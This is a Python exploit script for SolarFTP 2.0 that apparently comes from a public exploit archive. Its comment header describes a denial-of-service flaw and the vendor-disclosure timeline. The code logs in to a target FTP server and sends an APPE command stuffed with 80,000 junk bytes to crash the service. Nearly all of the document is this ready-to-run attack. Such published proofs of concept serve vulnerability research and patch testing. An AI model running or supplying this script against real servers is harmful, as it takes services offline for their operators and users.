#!/usr/bin/python

# Exploit Title: SolarFTP 2.0 Multiple Commands Denial of Service Vulnerability
# Date: 12/17/2010
# Author: modpr0be
# Software Link: http://www.solarftp.com/files/solarftps-setup.exe
# Vulnerable version: 2.0
# Tested on: Windows XP SP2, Windows XP SP3 
# CVE : N/A
#
# ======================================================================
#        ___       _ __        __            __    _     __
#   ____/ (_)___ _(_) /_____ _/ / ___  _____/ /_  (_)___/ /___  ____ _
#  / __  / / __ `/ / __/ __ `/ / / _ \/ ___/ __ \/ / __  / __ \/ __ `/
# / /_/ / / /_/ / / /_/ /_/ / / /  __/ /__/ / / / / /_/ / / / / /_/ /
# \__,_/_/\__, /_/\__/\__,_/_/  \___/\___/_/ /_/_/\__,_/_/ /_/\__,_/
#        /____/                          http://www.digital-echidna.org
# ======================================================================
#
# Greetz:
# 	say hello to all digital-echidna org crew:
# 		otoy, bean, s3o, d00m, n0rf0x, fm, gotechidna, manix
#	special thx to amalia (^^), oebaj, offsec, exploit-db, corelan team
#
#### Software description:
# Solar FTP Server is a handy and easy to use personal FTP server with 
# features like virtual directories, simple and intuitive user interface, 
# real-time activity monitoring and management.
#
#### Exploit information:
# SolarFTP 2.0 will suddenly stop (crash) while these commands were sent: 
# APPE, GET, PUT, NLST, and MDTM
# Sending USER with junk also crashing the Admin Configuration but not the service.
# Stack contains our junk in random. Both EIP and SEH were not overwritten.
#
#### Other information:
# 12/10/2010 - vendor contacted 
# 12/17/2010 - no response, advisory released

import socket, sys
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

junk = "\x41" * 80000

def banner():
	print "\nSolarFTP 2.0 Multiple Commands Denial of Service Vulnerability."
	print "By: modpr0be (modpr0be[at]digital-echidna[dot]org)\n"

	
if len(sys.argv)!=4:
        banner()
        print "Usage: %s <ip> <user> <pass>\n" %sys.argv[0]
        sys.exit(0)

try:
	s.connect((sys.argv[1], 21))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)
	
s.recv(1024)
s.send('USER '+sys.argv[2]+'\r\n')
s.recv(1024)
s.send('PASS '+sys.argv[3]+'\r\n')
s.recv(1024)
s.send('APPE '+junk+'\r\n')
s.recv(1024)
s.close()